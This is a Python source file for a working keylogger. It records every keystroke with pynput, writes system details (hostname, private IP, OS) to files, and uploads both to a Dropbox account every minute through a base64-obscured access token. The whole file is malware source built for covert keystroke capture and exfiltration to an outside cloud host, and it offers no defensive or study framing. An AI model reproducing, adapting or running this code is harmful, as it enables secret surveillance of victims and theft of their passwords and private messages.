# Name: main.py
# Auther: PAVAN KUMAR B
# DATE: 29-03-2024

from pynput.keyboard import Key, Listener
import platform
import socket
import os
import base64
import getpass
import dropbox
from datetime import datetime, timedelta
import time
import string

keys_information = "key_log.txt"
system_information = "sysinfo.txt"

file_path = "./"
extend = "/"
file_merge = file_path + extend

username = getpass.getuser()

# Dropbox access token
TOC = "<API_KEY_IN_BASE64>"

# Initialize Dropbox client
dbx = dropbox.Dropbox(base64.b64decode(TOC).decode('utf-8'))

# Function to log keystrokes
def on_press(key):
    with open(file_merge + keys_information, "a") as f:
        try:
            char = key.char
            if char.isalnum() or char in string.punctuation:
                f.write(char)
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write(' [Enter]\n')  # Log Enter key and start a new line
            else:
                f.write(f' [{key}]')  # Log other keys in square brackets

# Function to log system information
def computer_information():
    with open(file_merge + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Function to upload files to Dropbox
def upload_to_dropbox(file_path, dropbox_folder):
    try:
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                dbx.files_upload(f.read(), dropbox_folder)
                print(f"File uploaded successfully to Dropbox: {file_path}")
        else:
            print(f"File does not exist: {file_path}")
    except Exception as e:
        print(f"Error uploading file to Dropbox: {e}")

# Main function
def main():
    computer_information()  # Log system information only once
    upload_to_dropbox(file_merge + system_information, f"/{system_information}")  # Upload system information to Dropbox
    with Listener(on_press=on_press) as listener:
        while True:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            upload_to_dropbox(file_merge + keys_information, f"/{timestamp}_{keys_information}")  # Upload keystrokes to Dropbox
            time.sleep(60)  # Wait for 60 seconds before the next upload

if __name__ == "__main__":
    main()
